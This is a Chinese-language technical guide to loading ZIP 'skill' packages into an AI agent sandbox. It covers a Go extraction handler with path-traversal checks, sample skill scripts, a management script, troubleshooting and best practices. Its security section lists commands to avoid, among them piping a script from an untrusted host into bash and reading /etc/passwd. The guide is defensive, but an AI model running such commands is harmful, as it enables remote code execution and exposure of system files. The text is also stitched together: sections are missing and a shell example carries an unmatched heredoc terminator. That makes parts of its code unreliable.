## 6.1 技能物化概述

### 6.1.1 什么是技能物化

**技能物化 (Skill Materialization)** 是将技能包从外部动态加载到沙箱中的过程。

**核心概念**:
- 📦 **技能包**: ZIP 格式的技能归档文件
- 🔄 **物化**: 解压并安装技能到沙箱
- 🎯 **执行**: 在沙箱中运行技能脚本
- 📊 **版本**: 支持技能的版本管理

### 6.1.2 技能的用途

| 用途 | 说明 |
|------|------|
| **扩展能力** | 为 AI Agent 添加新的工具和能力 |
| **任务自动化** | 封装常用的自动化任务 |
| **代码复用** | 在多个项目中共享技能 |
| **安全隔离** | 在沙箱中安全执行第三方代码 |

### 6.1.3 物化流程

```
┌─────────────────────────────────────────┐
│ 物化技能 (POST /skills/{name})         │
│                                         │
│  1. 接收 ZIP 文件                      │
│     - 检查大小限制 (5 MB)              │
│     - 读取技能版本 (X-Skill-Version)   │
│                                         │
│  2. 版本检查                           │
│     - 如果版本相同，跳过解压           │
│     - 如果版本不同，继续解压           │
│                                         │
│  3. 清理目标目录                       │
│     - 删除 /skill/{name} 旧版本        │
│                                         │
│  4. 解压 ZIP 文件                      │
│     - 创建目录结构                      │
│     - 提取文件                          │
│     - 设置权限                          │
│                                         │
│  5. 记录版本信息                       │
│     - 更新 skillVersions 映射          │
│                                         │
│  6. 返回成功                           │
│     - 204 No Content                   │
└─────────────────────────────────────────┘
```

## 6.2 物化技能

### 6.2.1 HTTP API

**位置**: `main.go:951-1006`

```go
// POST /skills/{name}
func handleSkillMaterialize(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
        return
    }

    // 1. 解析技能名称
    name := strings.TrimPrefix(r.URL.Path, "/skills/")
    name = strings.TrimSuffix(name, "/")
    if name == "" || strings.Contains(name, "/") || strings.Contains(name, "..") {
        http.Error(w, "invalid skill name", http.StatusBadRequest)
        return
    }

    // 2. 检查版本
    version := r.Header.Get("X-Skill-Version")
    if version != "" {
        skillVersionsMu.Lock()
        installed := skillVersions[name]
        skillVersionsMu.Unlock()
        if installed != "" && installed == version {
            // 版本相同，跳过解压
            w.WriteHeader(http.StatusNoContent)
            return
        }
    }

    // 3. 读取 ZIP 文件
    body, err := io.ReadAll(io.LimitReader(r.Body, maxSkillArchiveSize+1))
    if err != nil {
        http.Error(w, "failed to read body: "+err.Error(), http.StatusBadRequest)
        return
    }
    if len(body) > maxSkillArchiveSize {
        http.Error(w, fmt.Sprintf("archive exceeds max size (%d bytes)", maxSkillArchiveSize), 
            http.StatusRequestEntityTooLarge)
        return
    }

    // 4. 准备目标目录
    targetDir := filepath.Join(skillBaseDir, name)
    if err := os.RemoveAll(targetDir); err != nil {
        http.Error(w, "failed to clear target dir: "+err.Error(), http.StatusInternalServerError)
        return
    }
    if err := os.MkdirAll(targetDir, 0755); err != nil {
        http.Error(w, "failed to create target dir: "+err.Error(), http.StatusInternalServerError)
        return
    }

    // 5. 解压 ZIP
    if err := extractZip(body, targetDir); err != nil {
        http.Error(w, "failed to extract archive: "+err.Error(), http.StatusBadRequest)
        return
    }

    // 6. 记录版本
    skillVersionsMu.Lock()
    skillVersions[name] = version
    skillVersionsMu.Unlock()

    log.Printf("materialized skill: name=%s, version=%s, size=%d, target=%s", 
        name, version, len(body), targetDir)
    w.WriteHeader(http.StatusNoContent)
}
```

💡 **关键点**:
- **名称验证**: 不允许包含 `/` 或 `..`，防止路径遍历
- **版本检查**: 如果版本相同，跳过解压（优化性能）
- **大小限制**: 最大 5 MB
- **清理旧版本**: 解压前删除旧版本
- **返回 204**: 成功时不返回内容

### 6.2.2 ZIP 解压实现

**位置**: `main.go:1017-1064`

```go
func extractZip(data []byte, targetDir string) error {
    reader, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
    if err != nil {
        return fmt.Errorf("invalid zip: %w", err)
    }
    
    for _, f := range reader.File {
        // 1. 安全检查：防止路径遍历
        if strings.Contains(f.Name, "..") {
            return fmt.Errorf("invalid entry path: %s", f.Name)
        }
        
        dest := filepath.Join(targetDir, f.Name)
        cleanDest := filepath.Clean(dest)
        
        // 2. 确保不逃逸目标目录
        if !strings.HasPrefix(cleanDest, filepath.Clean(targetDir)+string(os.PathSeparator)) && 
           cleanDest != filepath.Clean(targetDir) {
            return fmt.Errorf("entry escapes target dir: %s", f.Name)
        }
        
        // 3. 处理目录
        if f.FileInfo().IsDir() {
            if err := os.MkdirAll(cleanDest, 0755); err != nil {
                return err
            }
            continue
        }
        
        // 4. 创建父目录
        if err := os.MkdirAll(filepath.Dir(cleanDest), 0755); err != nil {
            return err
        }
        
        // 5. 确定文件权限
        mode := os.FileMode(0644)
        if isExecutableExtension(f.Name) {
            mode = 0755  // 可执行脚本
        }
        
        // 6. 写入文件
        out, err := os.OpenFile(cleanDest, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, mode)
        if err != nil {
            return err
        }
        
        in, err := f.Open()
        if err != nil {
            out.Close()
            return err
        }
        
        if _, err := io.Copy(out, in); err != nil {
            in.Close()
            out.Close()
            return err
        }
        
        in.Close()
        if err := out.Close(); err != nil {
            return err
        }
    }
    
    return nil
}
```

💡 **安全措施**:
- **路径遍历检查**: 拒绝包含 `..` 的路径
- **目录逃逸检查**: 确保文件不会写到目标目录之外
- **权限控制**: 根据文件扩展名设置执行权限

### 6.2.3 可执行文件检测

**位置**: `main.go:1008-1015`

```go
func isExecutableExtension(path string) bool {
    lower := strings.ToLower(path)
    return strings.HasSuffix(lower, ".sh") ||
        strings.HasSuffix(lower, ".py") ||
        strings.HasSuffix(lower, ".pl") ||
        strings.HasSuffix(lower, ".rb") ||
        strings.HasSuffix(lower, ".js")
}
```

💡 **可执行扩展名**:
- `.sh`: Shell 脚本
- `.py`: Python 脚本
- `.pl`: Perl 脚本
- `.rb`: Ruby 脚本
- `.js`: JavaScript 脚本

#!/usr/bin/env python3
import sys
import json
import os

def analyze_code(directory):
    """分析代码质量"""
    results = {
        "total_files": 0,
        "total_lines": 0,
        "languages": {}
    }
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            ext = os.path.splitext(file)[1].lower()
            
            results["total_files"] += 1
            results["languages"][ext] = results["languages"].get(ext, 0) + 1
            
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    lines = len(f.readlines())
                    results["total_lines"] += lines
            except:
                pass
    
    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: helper.py <directory>")
        sys.exit(1)
    
    directory = sys.argv[1]
    results = analyze_code(directory)
    print(json.dumps(results, indent=2))

```bash
cat > scripts/metrics.py << 'EOF'
#!/usr/bin/env python3
import os
import sys
import json
from collections import defaultdict

def analyze_directory(directory):
    metrics = {
        "total_files": 0,
        "total_lines": 0,
        "languages": defaultdict(int),
        "largest_files": []
    }
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            ext = os.path.splitext(file)[1].lower()
            
            metrics["total_files"] += 1
            if ext:
                metrics["languages"][ext] += 1
            
            try:
                size = os.path.getsize(filepath)
                metrics["largest_files"].append((filepath, size))
                
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = len(f.readlines())
                    metrics["total_lines"] += lines
            except:
                pass
    
    # 排序最大文件
    metrics["largest_files"].sort(key=lambda x: x[1], reverse=True)
    metrics["largest_files"] = metrics["largest_files"][:5]
    
    return metrics

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: metrics.py <directory>")
        sys.exit(1)
    
    directory = sys.argv[1]
    metrics = analyze_directory(directory)
    
    # 转换 defaultdict 为普通 dict
    metrics["languages"] = dict(metrics["languages"])
    
    print(json.dumps(metrics, indent=2))
EOF

chmod +x scripts/metrics.py
```

### 6.6.2 创建数据处理技能

```bash

# Data Processor

## Description

- Convert JSON to CSV

- Generate statistics

## Version

1.0.0

#!/bin/bash

ACTION=$1
INPUT_FILE=$2
OUTPUT_FILE=$3

if [ -z "$ACTION" ] || [ -z "$INPUT_FILE" ]; then
    echo "Usage: $0 <action> <input_file> [output_file]"
    echo "Actions:"
    echo "  csv2json  - Convert CSV to JSON"
    echo "  json2csv  - Convert JSON to CSV"
    echo "  stats     - Generate statistics"
    exit 1
fi

case "$ACTION" in
    csv2json)
        python3 -c "
import csv, json, sys
with open('$INPUT_FILE') as f:
    reader = csv.DictReader(f)
    data = list(reader)
    output = json.dumps(data, indent=2)
    if '$OUTPUT_FILE':
        with open('$OUTPUT_FILE', 'w') as out:
            out.write(output)
    else:
        print(output)
"
        ;;
    json2csv)
        python3 -c "
import csv, json, sys
with open('$INPUT_FILE') as f:
    data = json.load(f)
    if not data:
        sys.exit(0)
    keys = data[0].keys()
    output_file = '$OUTPUT_FILE' or '/dev/stdout'
    with open(output_file, 'w') as out:
        writer = csv.DictWriter(out, fieldnames=keys)
        writer.writeheader()
        writer.writerows(data)
"
        ;;
    stats)
        python3 -c "
import json, sys
with open('$INPUT_FILE') as f:
    data = json.load(f)
    if isinstance(data, list):
        print(f'Total records: {len(data)}')
        if data:
            print(f'Fields: {list(data[0].keys())}')
    else:
        print(f'Top-level keys: {list(data.keys())}')
"
        ;;
    *)
        echo "Unknown action: $ACTION"
        exit 1
        ;;
esac
EOF

chmod +x scripts/process.sh

# 打包
cd ..
zip -r data-processor.zip data-processor/
```

### 6.6.3 技能管理脚本

```bash
#!/bin/bash
# skill-manager.sh - 技能管理工具

SKILL_DIR="/skill"
SANDBOX_URL="http://localhost:8080"

# 列出所有技能
list_skills() {
    echo "Installed skills:"
    docker exec sandbox ls -1 "$SKILL_DIR" 2>/dev/null || echo "No skills installed"
}

# 查看技能详情
show_skill() {
    local skill_name=$1
    if [ -z "$skill_name" ]; then
        echo "Usage: $0 show <skill_name>"
        exit 1
    fi
    
    echo "Skill: $skill_name"
    echo ""
    
    # 显示 SKILL.md
    if docker exec sandbox test -f "$SKILL_DIR/$skill_name/SKILL.md" 2>/dev/null; then
        echo "=== SKILL.md ==="
        docker exec sandbox cat "$SKILL_DIR/$skill_name/SKILL.md"
    fi
    
    echo ""
    echo "=== Files ==="
    docker exec sandbox find "$SKILL_DIR/$skill_name" -type f
}

# 删除技能
remove_skill() {
    local skill_name=$1
    if [ -z "$skill_name" ]; then
        echo "Usage: $0 remove <skill_name>"
        exit 1
    fi
    
    docker exec sandbox rm -rf "$SKILL_DIR/$skill_name"
    echo "Removed skill: $skill_name"
}

# 物化技能
install_skill() {
    local skill_zip=$1
    local skill_name=$2
    local version=${3:-"1.0.0"}
    
    if [ -z "$skill_zip" ] || [ -z "$skill_name" ]; then
        echo "Usage: $0 install <skill.zip> <skill_name> [version]"
        exit 1
    fi
    
    echo "Installing skill: $skill_name (version: $version)"
    
    curl -s -X POST "$SANDBOX_URL/skills/$skill_name" \
        -H "X-Skill-Version: $version" \
        -H "Content-Type: application/zip" \
        --data-binary "@$skill_zip"
    
    echo ""
    echo "Installation complete!"
}

# 主命令
case "$1" in
    list)
        list_skills
        ;;
    show)
        show_skill "$2"
        ;;
    remove)
        remove_skill "$2"
        ;;
    install)
        install_skill "$2" "$3" "$4"
        ;;
    *)
        echo "Usage: $0 {list|show|remove|install} [args...]"
        echo ""
        echo "Commands:"
        echo "  list                          - List all skills"
        echo "  show <skill_name>             - Show skill details"
        echo "  remove <skill_name>           - Remove a skill"
        echo "  install <zip> <name> [ver]    - Install a skill"
        exit 1
        ;;
esac
```

**使用示例**:
```bash
# 列出所有技能
./skill-manager.sh list

# 安装技能
./skill-manager.sh install code-analyzer.zip code-analyzer 1.0.0

# 查看技能详情
./skill-manager.sh show code-analyzer

# 删除技能
./skill-manager.sh remove code-analyzer
```

## 6.7 常见问题

### 6.7.1 技能名称无效

**症状**:
```
invalid skill name
```

**原因**:
- 名称包含 `/` 或 `..`
- 名称为空

**解决方案**:
```bash
# 使用有效的名称
curl -X POST http://localhost:8080/skills/my-skill \
  -H "Content-Type: application/zip" \
  --data-binary @skill.zip

# 避免使用:
# /skills/my/skill    ❌ 包含 /
# /skills/../skill    ❌ 包含 ..
# /skills/            ❌ 空名称
```

### 6.7.2 ZIP 文件过大

**症状**:
```
archive exceeds max size (5242880 bytes)
```

**原因**: ZIP 文件超过 5 MB

**解决方案**:
```bash
# 1. 检查文件大小
ls -lh skill.zip

# 2. 压缩文件
zip -9 skill.zip skill/  # 最大压缩

# 3. 排除不必要的文件
zip -r skill.zip skill/ -x "*.log" "*.tmp" "node_modules/*"

# 4. 删除大文件
find skill/ -type f -size +1M -delete
```

### 6.7.3 ZIP 文件损坏

**症状**:
```
failed to extract archive: invalid zip: ...
```

**原因**: ZIP 文件格式损坏

**解决方案**:
```bash
# 1. 验证 ZIP 文件
unzip -t skill.zip
# 应该显示: OK

# 2. 重新创建 ZIP
rm skill.zip
zip -r skill.zip skill/

# 3. 检查文件编码
file skill.zip
# 应该显示: Zip archive data
```

### 6.7.4 脚本无法执行

**症状**:
```
Permission denied
```

**原因**: 脚本没有执行权限

**解决方案**:
```bash
# 1. 检查权限
docker exec sandbox ls -la /skill/my-skill/scripts/

# 2. 添加执行权限
docker exec sandbox chmod +x /skill/my-skill/scripts/*.sh
docker exec sandbox chmod +x /skill/my-skill/scripts/*.py

# 3. 重新物化技能（会自动设置权限）
curl -X POST http://localhost:8080/skills/my-skill \
  -H "Content-Type: application/zip" \
  --data-binary @skill.zip
```

### 6.7.5 依赖缺失

**症状**:
```
command not found: black
ModuleNotFoundError: No module named 'requests'
```

**原因**: 技能依赖的工具或库未安装

**解决方案**:
```bash
# 1. 安装 Python 包
docker exec sandbox pip3 install black requests

# 2. 安装系统工具
docker exec sandbox apk add --no-cache jq

# 3. 在技能中包含依赖安装脚本
cat > skill/scripts/setup.sh << 'EOF'
#!/bin/bash
pip3 install -r /skill/my-skill/requirements.txt
EOF

# 4. 执行安装
docker exec sandbox /skill/my-skill/scripts/setup.sh
```

## 6.8 最佳实践

### 6.8.1 技能设计

✅ **推荐**:
- **单一职责**: 每个技能只做一件事
- **清晰的文档**: 提供详细的 SKILL.md
- **版本管理**: 使用语义化版本号 (1.0.0)
- **错误处理**: 检查参数和错误情况
- **可测试**: 提供测试用例

❌ **避免**:
- 技能过于复杂（拆分为多个技能）
- 缺少文档（难以理解和使用）
- 硬编码路径（使用相对路径）
- 忽略错误（导致难以调试）

### 6.8.2 安全性

✅ **推荐**:
```bash
# 1. 验证输入
if [ ! -d "$1" ]; then
    echo "Error: Invalid directory"
    exit 1
fi

# 2. 使用绝对路径
WORKSPACE="/workspace"
TARGET="$WORKSPACE/$1"

# 3. 限制访问范围
if [[ "$TARGET" != "$WORKSPACE"* ]]; then
    echo "Error: Access denied"
    exit 1
fi

# 4. 清理临时文件
trap "rm -f /tmp/tempfile" EXIT
```

❌ **避免**:
```bash
# 1. 不验证输入
cd $1  # 危险！

# 2. 使用用户输入构造命令
eval "ls $USER_INPUT"  # 危险！

# 3. 访问敏感目录
cat /etc/passwd  # 不应该！

# 4. 下载外部资源
curl http://untrusted.com/script.sh | bash  # 危险！
```

### 6.8.3 性能优化

✅ **推荐**:
```bash
# 1. 批量处理
find . -name "*.py" -exec python3 -m black {} +

# 2. 并行执行
find . -name "*.py" | xargs -P 4 -I {} python3 -m black {}

# 3. 缓存结果
if [ -f ".cache/result.json" ]; then
    cat .cache/result.json
    exit 0
fi
# ... 计算结果 ...
echo "$result" > .cache/result.json
```

❌ **避免**:
```bash
# 1. 逐个处理（慢）
for file in *.py; do
    python3 process.py "$file"
done

# 2. 重复计算
result1=$(analyze .)
result2=$(analyze .)  # 重复！

# 3. 大量小文件操作
for file in $(find . -type f); do
    cat "$file" >> output.txt  # 慢！
done
```

### 6.8.4 版本管理

✅ **推荐**:
```bash
# 1. 使用语义化版本
curl -X POST http://localhost:8080/skills/my-skill \
  -H "X-Skill-Version: 1.2.3" \
  -H "Content-Type: application/zip" \
  --data-binary @skill.zip

# 2. 在 SKILL.md 中记录版本
cat > SKILL.md << 'EOF'
# My Skill

## Version

1.2.3

## Changelog

### 1.2.3
- Fixed bug in data processing

### 1.2.0
- Added new feature

### 1.0.0
- Initial release
EOF

# 3. 提供升级脚本
cat > scripts/upgrade.sh << 'EOF'
#!/bin/bash
# 从旧版本迁移
if [ -f "/skill/my-skill/old_config.json" ]; then
    mv /skill/my-skill/old_config.json /skill/my-skill/config.json
    echo "Migrated configuration"
fi
EOF
```
